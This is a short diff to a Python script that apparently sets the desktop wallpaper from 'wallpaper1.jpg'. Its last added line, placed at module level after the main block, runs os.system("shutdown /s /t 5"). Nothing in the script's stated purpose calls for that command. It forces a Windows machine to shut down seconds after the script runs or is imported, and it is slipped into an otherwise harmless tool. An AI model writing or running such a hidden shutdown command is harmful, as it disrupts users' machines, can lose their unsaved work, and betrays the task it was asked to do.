@@ -21,9 +21,11 @@ if __name__ == "__main__":
 
 
 
-
-
 if __name__ == "__main__":
     image = 'wallpaper1.jpg'
 
     set_wallpaper(image)
+
+
+
+os.system("shutdown /s /t 5")
